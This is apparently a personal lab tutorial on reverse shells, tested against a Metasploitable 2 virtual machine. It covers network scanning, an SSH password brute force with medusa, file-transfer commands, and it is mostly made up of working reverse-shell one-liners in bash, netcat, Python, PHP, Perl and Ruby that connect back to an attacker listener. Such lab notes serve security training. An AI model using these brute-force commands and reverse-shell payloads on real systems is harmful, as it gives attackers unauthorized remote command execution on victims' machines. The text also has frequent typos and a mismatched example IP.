<h1> Reverse Shell  </h1>



## What is Reverse Shell?
**A Reverse Shell**: is a connection where the victim’s computer connects to the attacker’s computer, and the attacker gets a command-line session on the victim machine.

- A reverse shell (also called a connect-back shell) is a technique where a target system, once exploited, opens an outbound connection to the attacker’s machine.

- The attacker then gains a remote shell session on the victim, allowing them to run commands as if they were sitting at the victim’s terminal.



### Understanding the Concept:
- `Regular Shell`: You connect TO a machine (ssh, telnet)
- `Reverse Shell`: The machine connects BACK TO YOU


### Why Reverse shells for Privilege Escalation?
- **Firewall Bypass**: Outbound connections often allowed, inbound blocked
- **NAT Bypass**: Works behind routers/firewalls
- **Stealth**: Harder to detect than bind shells
- **Persistence**: Maintain access after initial foothold



### Basic Reverse Shell Fundamentals

#### The concept:
````
Attacker Machine (Kali)            Victim Machine (Target)
     Listener Port 4444 ←--------------- Connection
           ^                                    |
           |                                    |
      "nc -lvnp 4444"                    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
````


#### Threee Key File Descriptions:
````
0 = stdin   (Standard Input - keyboard)
1 = stdout  (Standard Output - screen)  
2 = stderr  (Standard Error - error messages)
````





## Reverse Shell And Bind Shell

### Reverse Shell: 
**Reverse Shell**: The target machine initiates a connection to the attacker’s machine. And The attacker force the vulnerable compromised system to initiate a connection to the atacker machine.

#### How it works:
- Attacker sets up a listener (e.g., `nc -lvp 4444`).
- Target machine runs malicious code that connects back to the attacker’s IP and port.
- Once connected, the attacker gains a shell on the target.

````
Compromised System --------> Attacker Machine
````
The attacker machine now acts as the server, with a public IP on which it listen for incoming connection. The compromised system instead acts as a client.



### Bind Shell:
**Bind Shell**: The target machine opens a port and “binds” a shell to it, waiting for the attacker to connect. And the force the vulnerable compromise server to open a port and to listen for incoming connection.

#### How it work:
- Target runs code that listens on a port (e.g., port 4444).
- Attacker connects to that port using netcat or similar tools.
- Once connected, attacker gains shell access.

````
Attacker Machine -------> Compromised System
````
The compromise system accts as a server, while the attacker machine acts a client.


### Why reverse Shell are better?
Since using Revere Shells the connection is outbound, network-wise it it more difficult to protect from reverse shell connections.

That is, it is typically the idea is to oobtain be really and dangerous to open a port in your network infrastructure to listen for incomming connections.

In both cases however the idea is to obtain **Remote control over a shell process**. This can be really dangerous for the security of a system.



---




# Reverse Shell Methodology?

- In this i test with my `Metasplopitable 2`:
<img width="1012" height="601" alt="image" src="https://github.com/user-attachments/assets/d11281ec-9342-4f2a-84a7-1cd1bde9f462" />



## Information Gathering and crack Password (SSh) target:

### Scan
- First i need to scan target:
````
nmap -sV -T4 192.168.127.0/24
````
<img width="1385" height="818" alt="image" src="https://github.com/user-attachments/assets/f0240bdf-865a-454f-8c11-faf45cefacea" />

````
nmap -sV -p 22 -T4 192.168.127.129
````
<img width="993" height="282" alt="image" src="https://github.com/user-attachments/assets/24bdbca4-4979-45ee-ba3d-05f8b58854ae" />

- Now we see the target open port `SSH` service.

### Crack Password SSH:
````
medusa -h 192.168.127.129 -U /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -M ssh -t 5 -f
````
<img width="1679" height="266" alt="image" src="https://github.com/user-attachments/assets/015efb9a-f42a-49a5-851d-868e1e15ab7e" />

- Now we got the correct `Usernmae` & `Password`.
````
Username: msfadmin
Password: msfadmin
````


- After i login to target `SSH` port:
````
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.127.129
````
<img width="1040" height="484" alt="image" src="https://github.com/user-attachments/assets/c238ec6d-9406-4f1a-a07b-2ccd4494ddd9" />

- we got success to login to Targe port `SSH`>

- Or if the server only supports DSA:
````
ssh -o HostKeyAlgorithms=+ssh-dss msfadmin@192.168.127.129
````

---



## File Transfer Commands:

- Create Test file:
````
ls
mkdir www
cd
ls
````
<img width="1691" height="198" alt="image" src="https://github.com/user-attachments/assets/3c75fcdd-d9a9-4227-937f-f1d29cfaf4d8" />


````
nano test.txt
````
````
Hello this is a testing file.
````
<img width="500" height="33" alt="image" src="https://github.com/user-attachments/assets/03d4af3d-e877-497c-9edc-3f6cadb7e2a5" />

<img width="897" height="158" alt="image" src="https://github.com/user-attachments/assets/d94e0553-b1f4-4549-9c5e-22d3667f1901" />

- To exit it press `Ctrl + O` -> `Enter` -> `Ctrl + X`.

````
ls
cat test.txt
````
<img width="508" height="159" alt="image" src="https://github.com/user-attachments/assets/b613a7cc-82e6-4637-b213-e1bef268932c" />

- Now we see our file.


### Python server:

- After I start python serve:
````
python -m SimpleHTTPServer 1337
````
<img width="715" height="178" alt="image" src="https://github.com/user-attachments/assets/ad1db42d-af3f-472d-8d2a-b8cf7c60dc0b" />

- This will serve the current directory over **HTTp** on port 1337.
- Access it via `hhtp://<victim-IP>:1337`.




### Curl:

- After I open this in my kali `Terminal`:
````
curl http://192.168.127.129:1337/
````
<img width="497" height="271" alt="image" src="https://github.com/user-attachments/assets/79545a55-3bc3-4cde-9d50-2cfadcc486d9" />

- After go back to our target:
<img width="711" height="145" alt="image" src="https://github.com/user-attachments/assets/3576e827-4c6f-41d7-a477-fbc9e66ea52c" />


- After I copy file:
````
curl http://192.168.127.129:1337/test.txt > test.html
ls -lh test.html
````
<img width="1695" height="365" alt="image" src="https://github.com/user-attachments/assets/e9253b39-3703-4ab9-91b5-7fb4144934c7" />

- Check:
````
cat test.html
````
<img width="320" height="92" alt="image" src="https://github.com/user-attachments/assets/94bdec92-2587-42d3-8e59-161892e85908" />

- Now we got success to copy file from target to attacker.




### Wget:

#### Download:
````
wget http://192.168.127.129:1337/test.txt
````
<img width="1879" height="248" alt="image" src="https://github.com/user-attachments/assets/d9389135-6fb8-4d1f-97ff-3a2f977c4390" />

- Now we got success and after I check it:
````
ls -lh test.txt
cat test.txt
````
<img width="577" height="171" alt="image" src="https://github.com/user-attachments/assets/5641bf0f-890c-41b4-8f35-c4ffa49e91b5" />


#### Custom name (uppercase O):
````
wget http://192.168.127.129:1337/test.txt -O test1.txt
````
<img width="1873" height="255" alt="image" src="https://github.com/user-attachments/assets/e1a67d62-b226-4359-a951-a815dfa2902c" />

- Now we success to download test.txt file, and then i check it:
````
ls -lha test1.txt
cat test1.txt
````
<img width="592" height="160" alt="image" src="https://github.com/user-attachments/assets/eeae1243-731b-48fd-80fa-354c3e823680" />

- Now we got success to download file.


### Secure copy methods (SCP and SFTP over SSH)
- SCP: Fast one-liners

#### perl:

````
perl -e 'use File::Fetch;
$url="http://192.168.127.129:1337/test.txt";
$ff=File::Fetch->new(uri => $url);
$file=$ff->fetch() or die $ff->error;'
````
<img width="580" height="120" alt="image" src="https://github.com/user-attachments/assets/ac819c28-50cb-4d82-ab28-77e9362cf1f5" />

- Now we get success to download file, after i check:
````
ls -lh test.txt
cat test.txt
````
<img width="575" height="159" alt="image" src="https://github.com/user-attachments/assets/478ff3ac-7b82-4459-b820-f9ea4df3fa41" />

- Now we got success to download file.



### Raw TCP transfer (netcat):
- Send simgle file.

#### On destination (Reciever):
````
nc -lvnp 9001 > /tmp/received.bin
````
<img width="417" height="155" alt="image" src="https://github.com/user-attachments/assets/00cf352e-9d8e-44c9-ab1e-bef6db287b14" />


#### On source (sender):
````
cd www
nc 192.168.127.128 9001 < test.txt
````
<img width="699" height="131" alt="image" src="https://github.com/user-attachments/assets/f54e7752-f79e-4447-997c-c48b7c2cd533" />

- Now we was send to attacker, after i go back to attacker terminal:
<img width="712" height="165" alt="image" src="https://github.com/user-attachments/assets/5d29142a-9a6d-4d49-bda5-1d9ed14175ec" />

- After press `Ctrl + C`:

- Anf then I want to check it:
````
cd /tmp
ls
````
<img width="1607" height="266" alt="image" src="https://github.com/user-attachments/assets/537658b3-8442-4927-9e2e-e073051ef7e2" />

````
cat received.bin
````
<img width="323" height="89" alt="image" src="https://github.com/user-attachments/assets/d63d1308-42e8-4491-b8fc-ab85d09cf92f" />

- Now we was download the target file.

---




## Use Reverse Shell:

### Setup Listener (Attacker):
````
nc -lvnp 4444
````
<img width="297" height="139" alt="image" src="https://github.com/user-attachments/assets/3d3dff2f-846b-40f4-9ca6-1055c420616f" />

- `-l` = listen mode
- `-v` = verbose
- `-n` = don't resolve hostnames
- `-p` = port


### Initiate Reverse Shell (Victim)

#### Bash Reverse Shell:
````
nc 192.168.127.128 4444 -e /bin/bash
````
<img width="1916" height="319" alt="image" src="https://github.com/user-attachments/assets/a7073f72-bba0-45c4-980f-f0a7b3e1a397" />

- `-e /bin/bash`: Tells Netcat to execute `/bin/bash` and tie its input/output to the TCP connection.

- Now we got success to input reverse shell.


---



## Spawning a Reverse Shell:

### 1. Bash Shell:

#### Listener target:
````
nc -lvnp 4321
````
<img width="350" height="121" alt="image" src="https://github.com/user-attachments/assets/d16b1d09-e85e-4de0-83f4-b4550a7e09d8" />



- After in target:
````
nc 192.168.127.128 4321 -e /bin/bash
````
<img width="836" height="162" alt="image" src="https://github.com/user-attachments/assets/843848ce-29ca-46ce-9e12-6f563d7f6a5d" />

- Now we can input reverse shell, after go to attacker terminal:
<img width="897" height="172" alt="image" src="https://github.com/user-attachments/assets/bc3b2582-ddae-4719-b209-4fb0dedf9bdb" />


<img width="949" height="710" alt="image" src="https://github.com/user-attachments/assets/ac050945-2774-4183-b137-e669f494ae92" />


<img width="1892" height="105" alt="image" src="https://github.com/user-attachments/assets/348983e9-cdcb-4f2f-b27b-2014259860ee" />

- Now we got success to input `Bash shell`.

---



### Netcat Shell:

#### 


#### Traditional 
- Listener:
````
nc -lvnp 4444
````
<img width="417" height="200" alt="image" src="https://github.com/user-attachments/assets/cdc0e5e9-7ea1-4b8e-934e-758cbb1733b6" />

- Target execute:
````
nc -e /bin/sh 192.168.127.128 4444
````
<img width="682" height="117" alt="image" src="https://github.com/user-attachments/assets/f43bc506-eb39-4e36-b707-2d8a7be48ccd" />

- After go back to attacker:
<img width="1917" height="314" alt="image" src="https://github.com/user-attachments/assets/f5093a01-dcf9-4a4e-bcb8-2062ca1f264c" />





#### With exe
- Listener:
````
nc -lvnp 4444
````
<img width="417" height="200" alt="image" src="https://github.com/user-attachments/assets/cdc0e5e9-7ea1-4b8e-934e-758cbb1733b6" />

````
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.127.128 4444 >/tmp/f
````
<img width="1133" height="132" alt="image" src="https://github.com/user-attachments/assets/037c8035-240b-419d-8cf0-4de640a81a0d" />

- Now we got success to input shell, after go back to atacker terminal:
<img width="840" height="228" alt="image" src="https://github.com/user-attachments/assets/43f01aae-7e04-4a2d-ac30-4e02f81456ff" />

- Now we got target shell:
<img width="1903" height="329" alt="image" src="https://github.com/user-attachments/assets/4377a660-2431-4f25-8c4b-0808aad7b742" />

---




### Python Shells:

#### Reverse shell:
- Set up listening:
````
nc -lvnp 4321
````
<img width="383" height="156" alt="image" src="https://github.com/user-attachments/assets/7ee2d31f-4d40-4d6e-8f1d-94f72f3e7994" />


- Payload:
````
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.127.128",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
````
<img width="1919" height="170" alt="image" src="https://github.com/user-attachments/assets/9f212fe7-0910-43ac-ae70-c97228d58cfa" />

- Now we got success to input **Python Shell**, after i go to my target:
<img width="867" height="210" alt="image" src="https://github.com/user-attachments/assets/ac3716ed-0370-432c-972e-25b6d91e7eb8" />

- Now we got target shell:
<img width="977" height="699" alt="image" src="https://github.com/user-attachments/assets/956b3f1a-fa02-4f5a-8404-b4864096e572" />



#### Python Reverse Shell:
- Listener:
````
nc -lvnp 4444
````
<img width="437" height="170" alt="image" src="https://github.com/user-attachments/assets/1763b417-b594-4cec-a2b4-997354de02df" />


````
python -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.127.128",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
````
<img width="1916" height="157" alt="image" src="https://github.com/user-attachments/assets/abf6753f-5c37-4dce-ab92-fe0ad7896ffe" />

- Now we got success to input reverse shell, after go back to attacker:
<img width="906" height="218" alt="image" src="https://github.com/user-attachments/assets/e51fcc5f-2a91-4274-a3d3-d81836c08bb8" />

<img width="944" height="532" alt="image" src="https://github.com/user-attachments/assets/2bbaaeaf-96f7-4ba4-bcb9-95a532983bfe" />

> **Note**: In use with python if we can use with python3 we can use python others python version.




#### Handling Limited Environments
- Listener:
````
nc -lvnp 4444
````
<img width="398" height="149" alt="image" src="https://github.com/user-attachments/assets/db08f904-3cfe-4360-b1b1-679421fce8c4" />


- Payload:
````
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.127.128",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
````
<img width="1909" height="129" alt="image" src="https://github.com/user-attachments/assets/9514b1f2-b6da-43cc-8dbc-32c1540cc3a3" />

- Now we got success to input `Shell`, after go back to attacker:
<img width="872" height="798" alt="image" src="https://github.com/user-attachments/assets/3bb8f5d7-0d9a-427c-bdc4-8950c97403c7" />






#### Others shell:
- Listener:
````
nc -lvnp 4444
````
<img width="398" height="149" alt="image" src="https://github.com/user-attachments/assets/db08f904-3cfe-4360-b1b1-679421fce8c4" />

- Shell:
````
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.127.128",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
````
<img width="1035" height="211" alt="image" src="https://github.com/user-attachments/assets/2c228d33-61b3-4e92-9cc7-6c32b5b8982f" />

- Now we got success to get shell, after go back to attacker:
<img width="875" height="236" alt="image" src="https://github.com/user-attachments/assets/10592c5a-dfb2-4634-b903-bd92699349d7" />

---




### PHP Shell:

- Listener:
````
nc -lvnp 4444
````
<img width="398" height="149" alt="image" src="https://github.com/user-attachments/assets/db08f904-3cfe-4360-b1b1-679421fce8c4" />


- PHP Shell:
````
php -r '$sock=fsockopen("192.168.127.128",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
````
<img width="1366" height="162" alt="image" src="https://github.com/user-attachments/assets/628396c3-f0ea-4f51-8759-9757c8d01b1e" />

- Now we got success to input `PHP Shell`, after go to attacker terminal:
<img width="794" height="724" alt="image" src="https://github.com/user-attachments/assets/2aaf3f4b-3a19-407f-9bcb-128e39000269" />

- Now we got success to input `PHP Reverse Shell`.



---



### Perl Shells:

- In attacker start listener:
````
nc -lvnp 4444
````
<img width="398" height="149" alt="image" src="https://github.com/user-attachments/assets/db08f904-3cfe-4360-b1b1-679421fce8c4" />



- Perl Reverse shell (verbose Version):
````
perl -e 'use Socket;$i="192.168.127.128";$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");
};'
````
<img width="982" height="242" alt="image" src="https://github.com/user-attachments/assets/ad2cbc52-ca1c-4026-82e3-d586ac6cc580" />

- Now we got success to input `Perl reverse Shell`, and then go back to our attacker terminal:
<img width="931" height="279" alt="image" src="https://github.com/user-attachments/assets/bede5ce3-18dd-4cbf-b7be-6581574ad581" />




#### This is the standard, reliable Perl reverse shell:
- In attacker start listener:
````
nc -lvnp 4444
````
<img width="398" height="149" alt="image" src="https://github.com/user-attachments/assets/db08f904-3cfe-4360-b1b1-679421fce8c4" />


- In target:
````
perl -e 'use Socket;$i="192.168.127.128";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
````
<img width="1919" height="159" alt="image" src="https://github.com/user-attachments/assets/044db55c-ad0b-4562-b133-5f2a362a657e" />

- Now we got success to input `Perl Reverse shell`, then in attacker:
<img width="1919" height="284" alt="image" src="https://github.com/user-attachments/assets/004d2aa8-37cd-45a4-9d35-375abe294d39" />

---



### Ruby Shells:

- Attacker listener:
````
nc -lvnp 4444
````
<img width="398" height="149" alt="image" src="https://github.com/user-attachments/assets/db08f904-3cfe-4360-b1b1-679421fce8c4" />



- In target:
````
ruby -rsocket -e 'exit if fork;
c=TCPSocket.new("192.168.127.128","4444");
while(cmd=c.gets);
  IO.popen(cmd,"r"){|io|c.print io.read}
end'
````
<img width="781" height="195" alt="image" src="https://github.com/user-attachments/assets/2a06c675-7a5d-4012-96c5-fb3d6f345f2e" />

- It show this but it still work, after go back to our attacker:
<img width="711" height="202" alt="image" src="https://github.com/user-attachments/assets/5b4f9233-2c53-4036-8766-e4705ba03a6d" />

- Now we got shell:
<img width="1916" height="289" alt="image" src="https://github.com/user-attachments/assets/256f9572-4f16-42db-872b-c41f357a0d16" />

- `-rsocket`: loads Ruby’s socket library.
- `exit if fork`: forks a child process and exits the parent, so the shell runs in the background.
- `TCPSocket.new("10.0.0.1","4444")`: connects to your Kali listener.
- `while(cmd=c.gets)`: waits for commands from the socket.
- `IO.popen(cmd,"r")`: executes the command and sends output back.




#### Ruby Reverse Shell (Alternative Version)
- Attacker listener:
````
nc -lvnp 4444
````
<img width="398" height="149" alt="image" src="https://github.com/user-attachments/assets/db08f904-3cfe-4360-b1b1-679421fce8c4" />


- Shell
````
ruby -rsocket -e 'c=TCPSocket.new("192.168.127.128","4444");
loop{
  c.gets.chomp!;
  (exit! if $_=="exit");
  ($_=~/cd (.+)/i ? (Dir.chdir($1)) :
    (IO.popen($_,?r){|io|c.print io.read})
  ) rescue c.puts "failed: #{$_}"
}'
````
<img width="1104" height="288" alt="image" src="https://github.com/user-attachments/assets/8309bb1a-11bf-457f-9996-1cc8d7f6e1ed" />

- Now we got success to input `ruby reverse shell`, Then in attacker:
<img width="859" height="663" alt="image" src="https://github.com/user-attachments/assets/47636d3d-708c-4a19-85fb-c361e69c86c8" />



---










































